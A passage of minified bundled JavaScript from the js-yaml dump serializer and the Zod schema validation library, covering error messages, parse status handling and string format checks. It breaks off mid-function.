M8(X,Q,J,Y,W,G,H){if(X.tag=null,X.dump=J,!sV(X,J,!1))sV(X,J,!0);var $=B2.call(X.dump),z=Y,U;if(Y)Y=X.flowLevel<0||X.flowLevel>Q;var K=$==="[object Object]"||$==="[object Array]",B,q;if(K)B=X.duplicates.indexOf(J),q=B!==-1;if(X.tag!==null&&X.tag!=="?"||q||X.indent!==2&&Q>0)W=!1;if(q&&X.usedDuplicates[B])X.dump="*ref_"+B;else{if(K&&q&&!X.usedDuplicates[B])X.usedDuplicates[B]=!0;if($==="[object Object]"){if(Y&&Object.keys(X.dump).length!==0){if(lT(X,Q,X.dump,W),q)X.dump="&ref_"+B+X.dump}else if(cT(X,Q,X.dump),q)X.dump="&ref_"+B+" "+X.dump}else if($==="[object Array]"){if(Y&&X.dump.length!==0){if(X.noArrayIndent&&!H&&Q>0)oV(X,Q-1,X.dump,W);else oV(X,Q,X.dump,W);if(q)X.dump="&ref_"+B+X.dump}else if(uT(X,Q,X.dump),q)X.dump="&ref_"+B+" "+X.dump}else if($==="[object String]"){if(X.tag!=="?")yT(X,X.dump,Q,G,z)}else if($==="[object Undefined]")return!1;else{if(X.skipInvalid)return!1;throw new f9("unacceptable kind of an object to dump "+$)}if(X.tag!==null&&X.tag!=="?"){if(U=encodeURI(X.tag[0]==="!"?X.tag.slice(1):X.tag).replace(/!/g,"%21"),X.tag[0]==="!")U="!"+U;else if(U.slice(0,18)==="tag:yaml.org,2002:")U="!!"+U.slice(18);else U="!<"+U+">";X.dump=U+" "+X.dump}}return!0}function pT(X,Q){var J=[],Y=[],W,G;EG(X,J,Y);for(W=0,G=Y.length;W<G;W+=1)Q.duplicates.push(J[Y[W]]);Q.usedDuplicates=Array(G)}function EG(X,Q,J){var Y,W,G;if(X!==null&&typeof X==="object")if(W=Q.indexOf(X),W!==-1){if(J.indexOf(W)===-1)J.push(W)}else if(Q.push(X),Array.isArray(X))for(W=0,G=X.length;W<G;W+=1)EG(X[W],Q,J);else{Y=Object.keys(X);for(W=0,G=Y.length;W<G;W+=1)EG(X[Y[W]],Q,J)}}function dT(X,Q){Q=Q||{};var J=new bT(Q);if(!J.noRefs)pT(X,J);var Y=X;if(J.replacer)Y=J.replacer.call({"":Y},"",Y);if(M8(J,0,Y,!0,!0))return J.dump+`
`;return""}var iT=dT,rT={dump:iT};function vG(X,Q){return function(){throw Error("Function yaml."+X+" is removed in js-yaml 4. Use yaml."+Q+" instead, which is now safe by default.")}}var{load:N2,loadAll:F10}=V2,O10=rT.dump;var A10=vG("safeLoad","load"),R10=vG("safeLoadAll","loadAll"),L10=vG("safeDump","dump");var E1={};Y9(E1,{void:()=>k_,util:()=>Z0,unknown:()=>T_,union:()=>f_,undefined:()=>P_,tuple:()=>g_,transformer:()=>a_,symbol:()=>C_,string:()=>k2,strictObject:()=>x_,setErrorMap:()=>sT,set:()=>c_,record:()=>m_,quotelessJson:()=>aT,promise:()=>n_,preprocess:()=>t_,pipeline:()=>e_,ostring:()=>Xk,optional:()=>o_,onumber:()=>Qk,oboolean:()=>Jk,objectUtil:()=>xG,object:()=>v_,number:()=>b2,nullable:()=>s_,null:()=>S_,never:()=>__,nativeEnum:()=>r_,nan:()=>N_,map:()=>u_,makeIssue:()=>K4,literal:()=>d_,lazy:()=>p_,late:()=>L_,isValid:()=>XX,isDirty:()=>IJ,isAsync:()=>E7,isAborted:()=>wJ,intersection:()=>y_,instanceof:()=>D_,getParsedType:()=>p6,getErrorMap:()=>S7,function:()=>l_,enum:()=>i_,effect:()=>a_,discriminatedUnion:()=>h_,defaultErrorMap:()=>j8,datetimeRegex:()=>E2,date:()=>I_,custom:()=>_2,coerce:()=>Yk,boolean:()=>v2,bigint:()=>w_,array:()=>b_,any:()=>E_,addIssueToContext:()=>I1,ZodVoid:()=>B4,ZodUnknown:()=>QX,ZodUnion:()=>x7,ZodUndefined:()=>b7,ZodType:()=>U0,ZodTuple:()=>i6,ZodTransformer:()=>w6,ZodSymbol:()=>V4,ZodString:()=>R6,ZodSet:()=>mX,ZodSchema:()=>U0,ZodRecord:()=>q4,ZodReadonly:()=>c7,ZodPromise:()=>uX,ZodPipeline:()=>j4,ZodParsedType:()=>F1,ZodOptional:()=>D6,ZodObject:()=>c0,ZodNumber:()=>JX,ZodNullable:()=>O8,ZodNull:()=>v7,ZodNever:()=>d6,ZodNativeEnum:()=>g7,ZodNaN:()=>M4,ZodMap:()=>Z4,ZodLiteral:()=>y7,ZodLazy:()=>h7,ZodIssueCode:()=>B1,ZodIntersection:()=>f7,ZodFunction:()=>_7,ZodFirstPartyTypeKind:()=>e1,ZodError:()=>y9,ZodEnum:()=>WX,ZodEffects:()=>w6,ZodDiscriminatedUnion:()=>CJ,ZodDefault:()=>m7,ZodDate:()=>yX,ZodCatch:()=>u7,ZodBranded:()=>PJ,ZodBoolean:()=>k7,ZodBigInt:()=>YX,ZodArray:()=>L6,ZodAny:()=>gX,Schema:()=>U0,ParseStatus:()=>V9,OK:()=>O9,NEVER:()=>Wk,INVALID:()=>n1,EMPTY_PATH:()=>tT,DIRTY:()=>hX,BRAND:()=>R_});var Z0;(function(X){X.assertEqual=(W)=>{};function Q(W){}X.assertIs=Q;function J(W){throw Error()}X.assertNever=J,X.arrayToEnum=(W)=>{let G={};for(let H of W)G[H]=H;return G},X.getValidEnumValues=(W)=>{let G=X.objectKeys(W).filter(($)=>typeof W[W[$]]!=="number"),H={};for(let $ of G)H[$]=W[$];return X.objectValues(H)},X.objectValues=(W)=>{return X.objectKeys(W).map(function(G){return W[G]})},X.objectKeys=typeof Object.keys==="function"?(W)=>Object.keys(W):(W)=>{let G=[];for(let H in W)if(Object.prototype.hasOwnProperty.call(W,H))G.push(H);return G},X.find=(W,G)=>{for(let H of W)if(G(H))return H;return},X.isInteger=typeof Number.isInteger==="function"?(W)=>Number.isInteger(W):(W)=>typeof W==="number"&&Number.isFinite(W)&&Math.floor(W)===W;function Y(W,G=" | "){return W.map((H)=>typeof H==="string"?`'${H}'`:H).join(G)}X.joinValues=Y,X.jsonStringifyReplacer=(W,G)=>{if(typeof G==="bigint")return G.toString();return G}})(Z0||(Z0={}));var xG;(function(X){X.mergeShapes=(Q,J)=>{return{...Q,...J}}})(xG||(xG={}));var F1=Z0.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),p6=(X)=>{switch(typeof X){case"undefined":return F1.undefined;case"string":return F1.string;case"number":return Number.isNaN(X)?F1.nan:F1.number;case"boolean":return F1.boolean;case"function":return F1.function;case"bigint":return F1.bigint;case"symbol":return F1.symbol;case"object":if(Array.isArray(X))return F1.array;if(X===null)return F1.null;if(X.then&&typeof X.then==="function"&&X.catch&&typeof X.catch==="function")return F1.promise;if(typeof Map<"u"&&X instanceof Map)return F1.map;if(typeof Set<"u"&&X instanceof Set)return F1.set;if(typeof Date<"u"&&X instanceof Date)return F1.date;return F1.object;default:return F1.unknown}};var B1=Z0.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),aT=(X)=>{return JSON.stringify(X,null,2).replace(/"([^"]+)":/g,"$1:")};class y9 extends Error{get errors(){return this.issues}constructor(X){super();this.issues=[],this.addIssue=(J)=>{this.issues=[...this.issues,J]},this.addIssues=(J=[])=>{this.issues=[...this.issues,...J]};let Q=new.target.prototype;if(Object.setPrototypeOf)Object.setPrototypeOf(this,Q);else this.__proto__=Q;this.name="ZodError",this.issues=X}format(X){let Q=X||function(W){return W.message},J={_errors:[]},Y=(W)=>{for(let G of W.issues)if(G.code==="invalid_union")G.unionErrors.map(Y);else if(G.code==="invalid_return_type")Y(G.returnTypeError);else if(G.code==="invalid_arguments")Y(G.argumentsError);else if(G.path.length===0)J._errors.push(Q(G));else{let H=J,$=0;while($<G.path.length){let z=G.path[$];if($!==G.path.length-1)H[z]=H[z]||{_errors:[]};else H[z]=H[z]||{_errors:[]},H[z]._errors.push(Q(G));H=H[z],$++}}};return Y(this),J}static assert(X){if(!(X instanceof y9))throw Error(`Not a ZodError: ${X}`)}toString(){return this.message}get message(){return JSON.stringify(this.issues,Z0.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(X=(Q)=>Q.message){let Q={},J=[];for(let Y of this.issues)if(Y.path.length>0){let W=Y.path[0];Q[W]=Q[W]||[],Q[W].push(X(Y))}else J.push(X(Y));return{formErrors:J,fieldErrors:Q}}get formErrors(){return this.flatten()}}y9.create=(X)=>{return new y9(X)};var oT=(X,Q)=>{let J;switch(X.code){case B1.invalid_type:if(X.received===F1.undefined)J="Required";else J=`Expected ${X.expected}, received ${X.received}`;break;case B1.invalid_literal:J=`Invalid literal value, expected ${JSON.stringify(X.expected,Z0.jsonStringifyReplacer)}`;break;case B1.unrecognized_keys:J=`Unrecognized key(s) in object: ${Z0.joinValues(X.keys,", ")}`;break;case B1.invalid_union:J="Invalid input";break;case B1.invalid_union_discriminator:J=`Invalid discriminator value. Expected ${Z0.joinValues(X.options)}`;break;case B1.invalid_enum_value:J=`Invalid enum value. Expected ${Z0.joinValues(X.options)}, received '${X.received}'`;break;case B1.invalid_arguments:J="Invalid function arguments";break;case B1.invalid_return_type:J="Invalid function return type";break;case B1.invalid_date:J="Invalid date";break;case B1.invalid_string:if(typeof X.validation==="object")if("includes"in X.validation){if(J=`Invalid input: must include "${X.validation.includes}"`,typeof X.validation.position==="number")J=`${J} at one or more positions greater than or equal to ${X.validation.position}`}else if("startsWith"in X.validation)J=`Invalid input: must start with "${X.validation.startsWith}"`;else if("endsWith"in X.validation)J=`Invalid input: must end with "${X.validation.endsWith}"`;else Z0.assertNever(X.validation);else if(X.validation!=="regex")J=`Invalid ${X.validation}`;else J="Invalid";break;case B1.too_small:if(X.type==="array")J=`Array must contain ${X.exact?"exactly":X.inclusive?"at least":"more than"} ${X.minimum} element(s)`;else if(X.type==="string")J=`String must contain ${X.exact?"exactly":X.inclusive?"at least":"over"} ${X.minimum} character(s)`;else if(X.type==="number")J=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="bigint")J=`Number must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${X.minimum}`;else if(X.type==="date")J=`Date must be ${X.exact?"exactly equal to ":X.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(X.minimum))}`;else J="Invalid input";break;case B1.too_big:if(X.type==="array")J=`Array must contain ${X.exact?"exactly":X.inclusive?"at most":"less than"} ${X.maximum} element(s)`;else if(X.type==="string")J=`String must contain ${X.exact?"exactly":X.inclusive?"at most":"under"} ${X.maximum} character(s)`;else if(X.type==="number")J=`Number must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="bigint")J=`BigInt must be ${X.exact?"exactly":X.inclusive?"less than or equal to":"less than"} ${X.maximum}`;else if(X.type==="date")J=`Date must be ${X.exact?"exactly":X.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(X.maximum))}`;else J="Invalid input";break;case B1.custom:J="Invalid input";break;case B1.invalid_intersection_types:J="Intersection results could not be merged";break;case B1.not_multiple_of:J=`Number must be a multiple of ${X.multipleOf}`;break;case B1.not_finite:J="Number must be finite";break;default:J=Q.defaultError,Z0.assertNever(X)}return{message:J}},j8=oT;var w2=j8;function sT(X){w2=X}function S7(){return w2}var K4=(X)=>{let{data:Q,path:J,errorMaps:Y,issueData:W}=X,G=[...J,...W.path||[]],H={...W,path:G};if(W.message!==void 0)return{...W,path:G,message:W.message};let $="",z=Y.filter((U)=>!!U).slice().reverse();for(let U of z)$=U(H,{data:Q,defaultError:$}).message;return{...W,path:G,message:$}},tT=[];function I1(X,Q){let J=S7(),Y=K4({issueData:Q,data:X.data,path:X.path,errorMaps:[X.common.contextualErrorMap,X.schemaErrorMap,J,J===j8?void 0:j8].filter((W)=>!!W)});X.common.issues.push(Y)}class V9{constructor(){this.value="valid"}dirty(){if(this.value==="valid")this.value="dirty"}abort(){if(this.value!=="aborted")this.value="aborted"}static mergeArray(X,Q){let J=[];for(let Y of Q){if(Y.status==="aborted")return n1;if(Y.status==="dirty")X.dirty();J.push(Y.value)}return{status:X.value,value:J}}static async mergeObjectAsync(X,Q){let J=[];for(let Y of Q){let W=await Y.key,G=await Y.value;J.push({key:W,value:G})}return V9.mergeObjectSync(X,J)}static mergeObjectSync(X,Q){let J={};for(let Y of Q){let{key:W,value:G}=Y;if(W.status==="aborted")return n1;if(G.status==="aborted")return n1;if(W.status==="dirty")X.dirty();if(G.status==="dirty")X.dirty();if(W.value!=="__proto__"&&(typeof G.value<"u"||Y.alwaysSet))J[W.value]=G.value}return{status:X.value,value:J}}}var n1=Object.freeze({status:"aborted"}),hX=(X)=>({status:"dirty",value:X}),O9=(X)=>({status:"valid",value:X}),wJ=(X)=>X.status==="aborted",IJ=(X)=>X.status==="dirty",XX=(X)=>X.status==="valid",E7=(X)=>typeof Promise<"u"&&X instanceof Promise;var v1;(function(X){X.errToObj=(Q)=>typeof Q==="string"?{message:Q}:Q||{},X.toString=(Q)=>typeof Q==="string"?Q:Q?.message})(v1||(v1={}));class N6{constructor(X,Q,J,Y){this._cachedPath=[],this.parent=X,this.data=Q,this._path=J,this._key=Y}get path(){if(!this._cachedPath.length)if(Array.isArray(this._key))this._cachedPath.push(...this._path,...this._key);else this._cachedPath.push(...this._path,this._key);return this._cachedPath}}var I2=(X,Q)=>{if(XX(Q))return{success:!0,data:Q.value};else{if(!X.common.issues.length)throw Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;let J=new y9(X.common.issues);return this._error=J,this._error}}}};function G0(X){if(!X)return{};let{errorMap:Q,invalid_type_error:J,required_error:Y,description:W}=X;if(Q&&(J||Y))throw Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);if(Q)return{errorMap:Q,description:W};return{errorMap:(H,$)=>{let{message:z}=X;if(H.code==="invalid_enum_value")return{message:z??$.defaultError};if(typeof $.data>"u")return{message:z??Y??$.defaultError};if(H.code!=="invalid_type")return{message:$.defaultError};return{message:z??J??$.defaultError}},description:W}}class U0{get description(){return this._def.description}_getType(X){return p6(X.data)}_getOrReturnCtx(X,Q){return Q||{common:X.parent.common,data:X.data,parsedType:p6(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}_processInputParams(X){return{status:new V9,ctx:{common:X.parent.common,data:X.data,parsedType:p6(X.data),schemaErrorMap:this._def.errorMap,path:X.path,parent:X.parent}}}_parseSync(X){let Q=this._parse(X);if(E7(Q))throw Error("Synchronous parse encountered promise.");return Q}_parseAsync(X){let Q=this._parse(X);return Promise.resolve(Q)}parse(X,Q){let J=this.safeParse(X,Q);if(J.success)return J.data;throw J.error}safeParse(X,Q){let J={common:{issues:[],async:Q?.async??!1,contextualErrorMap:Q?.errorMap},path:Q?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:p6(X)},Y=this._parseSync({data:X,path:J.path,parent:J});return I2(J,Y)}"~validate"(X){let Q={common:{issues:[],async:!!this["~standard"].async},path:[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:p6(X)};if(!this["~standard"].async)try{let J=this._parseSync({data:X,path:[],parent:Q});return XX(J)?{value:J.value}:{issues:Q.common.issues}}catch(J){if(J?.message?.toLowerCase()?.includes("encountered"))this["~standard"].async=!0;Q.common={issues:[],async:!0}}return this._parseAsync({data:X,path:[],parent:Q}).then((J)=>XX(J)?{value:J.value}:{issues:Q.common.issues})}async parseAsync(X,Q){let J=await this.safeParseAsync(X,Q);if(J.success)return J.data;throw J.error}async safeParseAsync(X,Q){let J={common:{issues:[],contextualErrorMap:Q?.errorMap,async:!0},path:Q?.path||[],schemaErrorMap:this._def.errorMap,parent:null,data:X,parsedType:p6(X)},Y=this._parse({data:X,path:J.path,parent:J}),W=await(E7(Y)?Y:Promise.resolve(Y));return I2(J,W)}refine(X,Q){let J=(Y)=>{if(typeof Q==="string"||typeof Q>"u")return{message:Q};else if(typeof Q==="function")return Q(Y);else return Q};return this._refinement((Y,W)=>{let G=X(Y),H=()=>W.addIssue({code:B1.custom,...J(Y)});if(typeof Promise<"u"&&G instanceof Promise)return G.then(($)=>{if(!$)return H(),!1;else return!0});if(!G)return H(),!1;else return!0})}refinement(X,Q){return this._refinement((J,Y)=>{if(!X(J))return Y.addIssue(typeof Q==="function"?Q(J,Y):Q),!1;else return!0})}_refinement(X){return new w6({schema:this,typeName:e1.ZodEffects,effect:{type:"refinement",refinement:X}})}superRefine(X){return this._refinement(X)}constructor(X){this.spa=this.safeParseAsync,this._def=X,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this),this["~standard"]={version:1,vendor:"zod",validate:(Q)=>this["~validate"](Q)}}optional(){return D6.create(this,this._def)}nullable(){return O8.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return L6.create(this)}promise(){return uX.create(this,this._def)}or(X){return x7.create([this,X],this._def)}and(X){return f7.create(this,X,this._def)}transform(X){return new w6({...G0(this._def),schema:this,typeName:e1.ZodEffects,effect:{type:"transform",transform:X}})}default(X){let Q=typeof X==="function"?X:()=>X;return new m7({...G0(this._def),innerType:this,defaultValue:Q,typeName:e1.ZodDefault})}brand(){return new PJ({typeName:e1.ZodBranded,type:this,...G0(this._def)})}catch(X){let Q=typeof X==="function"?X:()=>X;return new u7({...G0(this._def),innerType:this,catchValue:Q,typeName:e1.ZodCatch})}describe(X){return new this.constructor({...this._def,description:X})}pipe(X){return j4.create(this,X)}readonly(){return c7.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}var eT=/^c[^\s-]{8,}$/i,X_=/^[0-9a-z]+$/,Q_=/^[0-9A-HJKMNP-TV-Z]{26}$/i,J_=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,Y_=/^[a-z0-9_-]{21}$/i,W_=/^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]*$/,G_=/^[-+]?P(?!$)(?:(?:[-+]?\d+Y)|(?:[-+]?\d+[.,]\d+Y$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:(?:[-+]?\d+W)|(?:[-+]?\d+[.,]\d+W$))?(?:(?:[-+]?\d+D)|(?:[-+]?\d+[.,]\d+D$))?(?:T(?=[\d+-])(?:(?:[-+]?\d+H)|(?:[-+]?\d+[.,]\d+H$))?(?:(?:[-+]?\d+M)|(?:[-+]?\d+[.,]\d+M$))?(?:[-+]?\d+(?:[.,]\d+)?S)?)??$/,H_=/^(?!\.)(?!.*\.\.)([A-Z0-9_'+\-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,$_="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$",fG,z_=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/,U_=/^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/(3[0-2]|[12]?[0-9])$/,K_=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))$/,V_=/^(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/,B_=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,q_=/^([0-9a-zA-Z-_]{4})*(([0-9a-zA-Z-_]{2}(==)?)|([0-9a-zA-Z-_]{3}(=)?))?$/,P2="((\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-((0[13578]|1[02])-(0[1-9]|[12]\\d|3[01])|(0[469]|11)-(0[1-9]|[12]\\d|30)|(02)-(0[1-9]|1\\d|2[0-8])))",Z_=new RegExp(`^${P2}$`);function S2(X){let Q="[0-5]\\d";if(X.precision)Q=`${Q}\\.\\d{${X.precision}}`;else if(X.precision==null)Q=`${Q}(\\.\\d+)?`;let J=X.precision?"+":"?";return`([01]\\d|2[0-3]):[0-5]\\d(:${Q})${J}`}function M_(X){return new RegExp(`^${S2(X)}$`)}function E2(X){let Q=`${P2}T${S2(X)}`,J=[];if(J.push(X.local?"Z?":"Z"),X.offset)J.push("([+-]\\d{2}:?\\d{2})");return Q=`${Q}(${J.join("|")})`,new RegExp(`^${Q}$`)}function j_(X,Q){if((Q==="v4"||!Q)&&z_.test(X))return!0;if((Q==="v6"||!Q)&&K_.test(X))return!0;return!1}function F_(X,Q){if(!W_.test(X))return!1;try{let[J]=X.split(".");if(!J)return!1;let Y=J.replace(/-/g,"+").replace(/_/g,"/").padEnd(J.length+(4-J.length%4)%4,"="),W=JSON.parse(atob(Y));if(typeof W!=="object"||W===null)return!1;if("typ"in W&&W?.typ!=="JWT")return!1;if(!W.alg)return!1;if(Q&&W.alg!==Q)return!1;return!0}catch{return!1}}function O_(X,Q){if((Q==="v4"||!Q)&&U_.test(X))return!0;if((Q==="v6"||!Q)&&V_.test(X))return!0;return!1}class R6 extends U0{_parse(X){if(this._def.coerce)X.data=String(X.data);if(this._getType(X)!==F1.string){let W=this._getOrReturnCtx(X);return I1(W,{code:B1.invalid_type,expected:F1.string,received:W.parsedType}),n1}let J=new V9,Y=void 0;for(let W of this._def.checks)if(W.kind==="min"){if(X.data.length<W.value)Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),J.dirty()}else if(W.kind==="max"){if(X.data.length>W.value)Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!1,message:W.message}),J.dirty()}else if(W.kind==="length"){let G=X.data.length>W.value,H=X.data.length<W.value;if(G||H){if(Y=this._getOrReturnCtx(X,Y),G)I1(Y,{code:B1.too_big,maximum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});else if(H)I1(Y,{code:B1.too_small,minimum:W.value,type:"string",inclusive:!0,exact:!0,message:W.message});J.dirty()}}else if(W.kind==="email"){if(!H_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"email",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="emoji"){if(!fG)fG=new RegExp($_,"u");if(!fG.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"emoji",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="uuid"){if(!J_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"uuid",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="nanoid"){if(!Y_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"nanoid",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="cuid"){if(!eT.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"cuid",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="cuid2"){if(!X_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"cuid2",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="ulid"){if(!Q_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"ulid",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="url")try{new URL(X.data)}catch{Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"url",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="regex"){if(W.regex.lastIndex=0,!W.regex.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"regex",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="trim")X.data=X.data.trim();else if(W.kind==="includes"){if(!X.data.includes(W.value,W.position))Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.invalid_string,validation:{includes:W.value,position:W.position},message:W.message}),J.dirty()}else if(W.kind==="toLowerCase")X.data=X.data.toLowerCase();else if(W.kind==="toUpperCase")X.data=X.data.toUpperCase();else if(W.kind==="startsWith"){if(!X.data.startsWith(W.value))Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.invalid_string,validation:{startsWith:W.value},message:W.message}),J.dirty()}else if(W.kind==="endsWith"){if(!X.data.endsWith(W.value))Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.invalid_string,validation:{endsWith:W.value},message:W.message}),J.dirty()}else if(W.kind==="datetime"){if(!E2(W).test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.invalid_string,validation:"datetime",message:W.message}),J.dirty()}else if(W.kind==="date"){if(!Z_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.invalid_string,validation:"date",message:W.message}),J.dirty()}else if(W.kind==="time"){if(!M_(W).test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{code:B1.invalid_string,validation:"time",message:W.message}),J.dirty()}else if(W.kind==="duration"){if(!G_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"duration",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="ip"){if(!j_(X.data,W.version))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"ip",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="jwt"){if(!F_(X.data,W.alg))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"jwt",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="cidr"){if(!O_(X.data,W.version))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"cidr",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="base64"){if(!B_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"base64",code:B1.invalid_string,message:W.message}),J.dirty()}else if(W.kind==="base64url"){if(!q_.test(X.data))Y=this._getOrReturnCtx(X,Y),I1(Y,{validation:"base64url",code:B1.invalid_string,message:W.message}),J.dirty()}else Z0.assertNever(W);return{status:J.value,value:X.data}}_regex(X,Q,J){return 